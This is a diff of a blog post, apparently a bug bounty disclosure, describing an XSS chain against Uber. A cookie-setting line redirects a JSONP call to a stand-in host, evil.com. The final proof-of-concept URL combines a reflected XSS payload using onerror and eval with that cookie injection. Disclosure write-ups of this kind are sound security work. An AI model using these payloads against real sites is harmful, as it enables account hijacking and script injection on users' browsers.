@@ -4,7 +4,6 @@ title: Uber XSS via Cookie
 categories: articles
 ---
 
-<h1 align="center">{{ page.title }}</h1>
 <p align="right" class="date">{{ page.date | date_to_string }} - zhchbin</p>
 
 &nbsp;&nbsp;&nbsp;This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.
@@ -13,7 +12,7 @@ categories: articles
 
 &nbsp;&nbsp;&nbsp;Several months ago, when enjoying my Spring Festival Holiday at home, I decided to do something interesting, so I started hunting for a bug. I like searching in the chrome dev tools. This time my lucky word was jsonp, and my target domain was `https://get.uber.com`. Let’s look at what I had found at that time.
 
-```
+{% highlight javascript %}
 idrCall: function() {
     var a, b;
     return this.idrCallPending ? void 0 : (this.log("making idr call"),
@@ -22,7 +21,7 @@ idrCall: function() {
     this.jsonpGet(b, {}, this.idrCallback, "cmZpSWRJbkNhY2hl"),
     this.idrCallPending = !0)
 },
-```
+{% endhighlight %}
 
 <img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe8cbagsj21d00r0gsw.jpg">
 
@@ -32,10 +31,10 @@ idrCall: function() {
 
 After reading through these lines of code:
 
-```
+{% highlight javascript %}
 a = this.readCookie("_rfiServer"),
 null != a && this.setRfiServer(a),
-```
+{% endhighlight %}
 
 &nbsp;&nbsp;&nbsp;We could get the information that the initial value of `this.rfiServer` was set by using value of cookie `_rfiServer` if exists. Now the problem became how we can set cookie of Uber sites? But how? Here was the options in my mind at that time:
 
@@ -48,9 +47,9 @@ What? We need to find a bug to trigger another bug. And why any subdomain of ube
 
 &nbsp;&nbsp;&nbsp;Any subdomain of uber.com can set cookie with domain `.uber.com` to be used across subdomains. For instance, we can set cookie in `xxx.uber.com` using following code, then `get.uber.com` will use the cookie value.
 
-```
+{% highlight javascript %}
 document.cookie = '_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'
-```
+{% endhighlight %}
 
 <img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe87abluj20yt0u0qel.jpg">
 
@@ -70,11 +69,11 @@ I did really find out one reflected XSS in one of Uber’s subdomain using searc
 2. Visit `get.uber.com`, JSONP request to `https://evil.com/idr.js`, XSS of `get.uber.com` is done.
 3. The final PoC
 
-```
+{% highlight javascript %}
 https://<redacted>.uber.com/<redacted>?
 email=aaa"%20type%3d"image"%20src%3d1%20o>nerror%3d"eval(decodeURIComponent(location.hash.substr(1)))
 #document.cookie='_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/';location.href="https://get.uber.com";
-```
+{% endhighlight %}
 
 Thanks for Uber. Reward: 5k
 
